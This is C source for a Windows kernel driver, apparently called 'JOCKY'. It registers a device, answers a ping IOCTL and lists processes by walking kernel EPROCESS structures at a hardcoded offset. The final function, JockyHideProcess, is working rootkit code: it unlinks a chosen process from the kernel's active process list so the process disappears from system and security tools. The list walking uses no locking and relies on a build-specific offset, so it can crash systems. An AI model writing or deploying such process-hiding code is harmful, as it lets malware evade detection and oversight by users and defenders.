#include <ntddk.h>
#include "IoctlCommon.h"


void DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, SYMBOLIC_LINK_NAME);
    
    IoDeleteSymbolicLink(&symLink);
    if (DriverObject->DeviceObject) {
        IoDeleteDevice(DriverObject->DeviceObject);
    }
    
    DbgPrint("[JOCKY Driver] Unloaded successfully.\n");
}

NTSTATUS CreateCloseRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return STATUS_SUCCESS;
}

NTSTATUS IoControlRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    ULONG bytesReturned = 0;

    ULONG ioctlCode = irpSp->Parameters.DeviceIoControl.IoControlCode;

    if (ioctlCode == IOCTL_JOCKY_PING) {
        DbgPrint("[JOCKY Driver] Success: Received IOCTL_JOCKY_PING from User-Mode Client!\n");
        status = STATUS_SUCCESS;

    } else if (ioctlCode == IOCTL_JOCKY_ENUM_PROCS) {
        PROCESS_LIST* outBuf = (PROCESS_LIST*)Irp->AssociatedIrp.SystemBuffer;
        ULONG outBufLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

        if (outBuf && outBufLen >= sizeof(PROCESS_LIST)) {
            RtlZeroMemory(outBuf, sizeof(PROCESS_LIST));

            PEPROCESS proc = PsGetCurrentProcess();
            PEPROCESS startProc = proc;
            ULONG count = 0;

            do {
                if (count >= MAX_PROCESSES) break;

                ULONG pid = (ULONG)(ULONG_PTR)PsGetProcessId(proc);
                PCHAR name = (PCHAR)PsGetProcessImageFileName(proc);

                outBuf->Entries[count].Pid = pid;
                RtlCopyMemory(outBuf->Entries[count].ImageName, name, 15);
                outBuf->Entries[count].ImageName[15] = '\0';
                count++;

                PLIST_ENTRY flink = (PLIST_ENTRY)((ULONG_PTR)proc + 0x448);
                proc = (PEPROCESS)((ULONG_PTR)flink->Flink - 0x448);

            } while (proc != startProc);

            outBuf->Count = count;
            bytesReturned = sizeof(PROCESS_LIST);
            status = STATUS_SUCCESS;
            DbgPrint("[JOCKY Driver] Enumerated %lu processes.\n", count);
        } else {
            status = STATUS_BUFFER_TOO_SMALL;
        }

    } else {
        DbgPrint("[JOCKY Driver] Unknown IOCTL code received: 0x%X\n", ioctlCode);
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesReturned;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    DbgPrint("[JOCKY Driver] IOCTL request completed with status: 0x%X, bytes returned: %lu\n", status, bytesReturned);
    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    
    NTSTATUS status;
    PDEVICE_OBJECT deviceObject = NULL;
    UNICODE_STRING devName, symLink;

    RtlInitUnicodeString(&devName, DEVICE_NAME_SYS);
    RtlInitUnicodeString(&symLink, SYMBOLIC_LINK_NAME);

    status = IoCreateDevice(
        DriverObject,
        0,
        &devName,
        JOCKY_DEVICE_TYPE,
        0,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[JOCKY Driver] Failed to create device object (0x%X)\n", status);
        return status;
    }

    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[JOCKY Driver] Failed to create symbolic link (0x%X)\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseRoutine;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseRoutine;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlRoutine;
    DriverObject->DriverUnload = DriverUnload;

    DbgPrint("[JOCKY Driver] Loaded successfully and device registered.\n");
    return STATUS_SUCCESS;
}

NTSTATUS JockyHideProcess(ULONG targetPid) {
    PEPROCESS proc = PsGetCurrentProcess();
    PEPROCESS startProc = proc;

    do {
        ULONG pid = (ULONG)(ULONG_PTR)PsGetProcessId(proc);

        if (pid == targetPid) {
            // Found target — unlink from ActiveProcessLinks
            PLIST_ENTRY entry = (PLIST_ENTRY)(
                (ULONG_PTR)proc + 0x448
            );

            // Relink previous and next entries around this one
            entry->Blink->Flink = entry->Flink;
            entry->Flink->Blink = entry->Blink;

            // Point entry to itself — safe if anything walks it later
            entry->Flink = entry;
            entry->Blink = entry;

            DbgPrint("[JOCKY] Process PID %lu hidden from list\n",
                     targetPid);
            return STATUS_SUCCESS;
        }

        PLIST_ENTRY flink = (PLIST_ENTRY)(
            (ULONG_PTR)proc + 0x448
        );
        proc = (PEPROCESS)((ULONG_PTR)flink->Flink - 0x448);

    } while (proc != startProc);

    DbgPrint("[JOCKY] PID %lu not found\n", targetPid);
    return STATUS_NOT_FOUND;
}